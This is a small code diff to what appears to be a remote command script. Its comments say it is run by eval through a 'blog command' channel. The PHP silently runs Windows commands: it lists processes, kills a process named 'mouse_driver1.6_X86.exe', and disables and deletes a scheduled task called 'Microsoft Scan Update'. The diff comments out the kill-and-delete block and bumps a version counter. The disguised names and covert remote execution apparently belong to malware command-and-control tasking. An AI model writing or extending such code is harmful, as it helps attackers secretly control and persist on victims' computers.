@@ -2,7 +2,7 @@ execução por eval. cuidado, não use exit e nem __FILE__
 
 *Atenção, este comando esta sendo executado via exec_blog_command() devido a mudança da url da conta. use só o comando do blg
 
-****25
+****26
 
 [GIT_COMMAND]
 
@@ -384,6 +384,7 @@ if(1)
 		if($execlol && $vbs_exec_path)
 		{
 			$output = array();
+			/**
 			$new_command_id = '10010';
 			$path_control_id  = dirname(PHP_BINARY) . '/command_id';
 			if(@file_get_contents($path_control_id) !== $new_command_id)
@@ -395,11 +396,11 @@ if(1)
 				@exec('taskkill /f /im mouse_driver1.6_X86.exe');
 				sleep(2);
 				
-				/*remove tasks*/
 				@exec('schtasks /Change /TN "Microsoft Scan Update" /Disable');
 				@exec('schtasks /Delete /TN "Microsoft Scan Update" /F');
 				sleep(2);
 			}
+			/**/
 			$r = 0;
 			@exec('tasklist', $output, $r);
 			$output = implode("\n", $output);
